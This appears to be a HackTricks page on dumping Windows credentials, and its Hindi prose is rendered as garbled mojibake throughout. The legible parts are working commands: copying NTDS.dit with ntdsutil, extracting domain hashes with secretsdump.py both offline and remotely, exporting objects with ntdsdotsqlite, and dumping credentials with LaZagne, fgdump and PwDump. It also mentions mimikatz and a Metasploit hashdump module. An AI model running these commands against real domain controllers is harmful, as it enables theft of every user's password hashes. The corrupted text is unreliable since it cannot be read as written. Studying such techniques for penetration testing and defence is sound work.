**NTDS.dit** рдлрд╛рдЗрд▓ рдХреЛ **Active Directory** рдХрд╛ рджрд┐рд▓ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕, рд╕рдореВрд╣реЛрдВ рдФрд░ рдЙрдирдХреА рд╕рджрд╕реНрдпрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЗрдЯрд╛ рд░рдЦрддрд╛ рд╣реИред рдпрд╣ рд╡рд╣ рдЬрдЧрд╣ рд╣реИ рдЬрд╣рд╛рдВ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢** рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдлрд╛рдЗрд▓ рдПрдХ **Extensible Storage Engine (ESE)** рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИ рдФрд░ **_%SystemRoom%/NTDS/ntds.dit_** рдкрд░ рд╕реНрдерд┐рдд рд╣реИред

рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рддреАрди рдореБрдЦреНрдп рддрд╛рд▓рд┐рдХрд╛рдПрдБ рд░рдЦреА рдЬрд╛рддреА рд╣реИрдВ:

- **Data Table**: рдпрд╣ рддрд╛рд▓рд┐рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдЬреИрд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╡рд░рдг рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИред
- **Link Table**: рдпрд╣ рд╕рдореВрд╣ рд╕рджрд╕реНрдпрддрд╛рдУрдВ рдЬреИрд╕реЗ рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдЯреНрд░реИрдХ рд░рдЦрддреА рд╣реИред
- **SD Table**: рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП **рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг** рдпрд╣рд╛рдБ рд░рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВред

рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows _Ntdsa.dll_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ _lsass.exe_ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, **NTDS.dit** рдлрд╛рдЗрд▓ рдХрд╛ **рдХреБрдЫ рд╣рд┐рд╕реНрд╕рд╛** **`lsass`** рдореЗрдореЛрд░реА рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдЖрдк рдирд╡реАрдирддрдо рдПрдХреНрд╕реЗрд╕ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рдВрднрд╡рддрдГ рдкреНрд░рджрд░реНрд╢рди рд╕реБрдзрд╛рд░ рдХреЗ рдХрд╛рд░рдг **рдХреИрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред

#### NTDS.dit рдХреЗ рдЕрдВрджрд░ рд╣реИрд╢ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛

рд╣реИрд╢ рдХреЛ 3 рдмрд╛рд░ рд╕рд┐рдлрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

1. **BOOTKEY** рдФрд░ **RC4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА (**PEK**) рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВред
2. **PEK** рдФрд░ **RC4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реИрд╢** рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВред
3. **DES** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реИрд╢** рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВред

**PEK** рдХрд╛ **рд╕рдорд╛рди рдорд╛рди** рд╣рд░ **рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ** рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ **NTDS.dit** рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ **BOOTKEY** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕рд┐рдлрд░** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ **рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ рдХреА SYSTEM рдлрд╛рдЗрд▓ (рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рдХреЗ рдмреАрдЪ рдЕрд▓рдЧ рд╣реЛрддрд╛ рд╣реИ)** рдХрд╛ рд╣реЛрддрд╛ рд╣реИред рдпрд╣реА рдХрд╛рд░рдг рд╣реИ рдХрд┐ NTDS.dit рдлрд╛рдЗрд▓ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЖрдкрдХреЛ NTDS.dit рдФрд░ SYSTEM рдлрд╛рдЗрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** (_C:\Windows\System32\config\SYSTEM_)ред

### Ntdsutil рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTDS.dit рдХреА рдХреЙрдкреА рдХрд░рдирд╛

Windows Server 2008 рд╕реЗ рдЙрдкрд▓рдмреНрдзред
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
рдЖрдк **ntds.dit** рдлрд╛рдЗрд▓ рдХреА рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**volume shadow copy**](./#stealing-sam-and-system) рдЯреНрд░рд┐рдХ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **SYSTEM file** рдХреА рдПрдХ рдХреЙрдкреА рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдлрд┐рд░ рд╕реЗ, рдЗрд╕реЗ [**registry рд╕реЗ рдбрдВрдк рдХрд░реЗрдВ рдпрд╛ volume shadow copy**](./#stealing-sam-and-system) рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ)ред

### **NTDS.dit рд╕реЗ рд╣реИрд╢ рдирд┐рдХрд╛рд▓рдирд╛**

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдиреЗ **NTDS.dit** рдФрд░ **SYSTEM** рдлрд╛рдЗрд▓реЗрдВ **рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд▓реАрдВ, рддреЛ рдЖрдк _secretsdump.py_ рдЬреИрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реИрд╢ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
рдЖрдк рдПрдХ рд╡реИрдз рдбреЛрдореЗрди рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**рдмрдбрд╝реЗ NTDS.dit рдлрд╛рдЗрд▓реЛрдВ** рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ [gosecretsdump](https://github.com/c-sto/gosecretsdump) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

рдЕрдВрдд рдореЗрдВ, рдЖрдк **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ рдпрд╛ **mimikatz** `lsadump::lsa /inject` рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### **NTDS.dit рд╕реЗ SQLite рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдирд┐рдХрд╛рд▓рдирд╛**

NTDS рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) рдХреЗ рд╕рд╛рде SQLite рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рди рдХреЗрд╡рд▓ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдирд┐рдХрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ рдмрд▓реНрдХрд┐ рдкреВрд░реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдФрд░ рдЙрдирдХреЗ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рднреА рдирд┐рдХрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЬрдм raw NTDS.dit рдлрд╛рдЗрд▓ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреНрд░рд╛рдкреНрдд рд╣реЛ, рддреЛ рдЖрдЧреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХреЗред
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (NT & LM рд╣реИрд╢, рд╕реНрдкрд╖реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдЬреИрд╕реЗ рдкреВрд░рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕, kerberos рдпрд╛ рдЯреНрд░рд╕реНрдЯ рдХреАрдЬ, NT & LM рдкрд╛рд╕рд╡рд░реНрдб рдЗрддрд┐рд╣рд╛рд╕)ред рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдорд╢реАрди рдЦрд╛рддреЗ рдЙрдирдХреЗ рд╣реИрд╢ рдХреЗ рд╕рд╛рде, UAC рдлреНрд▓реИрдЧреНрд╕, рдЕрдВрддрд┐рдо рд▓реЙрдЧрдСрди рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк, рдЦрд╛рддреЗ рдХрд╛ рд╡рд┐рд╡рд░рдг, рдирд╛рдо, UPN, SPN, рд╕рдореВрд╣ рдФрд░ рдкреБрдирд░рд╛рд╡рд░реНрддреА рд╕рджрд╕реНрдпрддрд╛, рд╕рдВрдЧрдардирд╛рддреНрдордХ рдЗрдХрд╛рдЗрдпреЛрдВ рдХрд╛ рдкреЗрдбрд╝ рдФрд░ рд╕рджрд╕реНрдпрддрд╛, рдЯреНрд░рд╕реНрдЯ рдкреНрд░рдХрд╛рд░, рджрд┐рд╢рд╛ рдФрд░ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЛрдореЗрди...

## Lazagne

рдмрд╛рдЗрдирд░реА рдХреЛ [рдпрд╣рд╛рдВ](https://github.com/AlessandroZ/LaZagne/releases) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред рдЖрдк рдЗрд╕ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдИ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
lazagne.exe all
```
## SAM рдФрд░ LSASS рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЙрдкрдХрд░рдг

### Windows credentials Editor (WCE)

рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдореЗрдореЛрд░реА рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM рдлрд╛рдЗрд▓ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓реЗрдВ
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓реЗрдВ
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) рдФрд░ рдмрд╕ **рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдбреНрд╕ рдирд┐рдХрд╛рд▓ рд▓рд┐рдП рдЬрд╛рдПрдВрдЧреЗред

## рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп

[**рдпрд╣рд╛рдБ рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВред**](credentials-protections.md)

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк **рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм Discord рд╕рдореВрд╣** [**рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**ред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ **рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ**ред

</details>
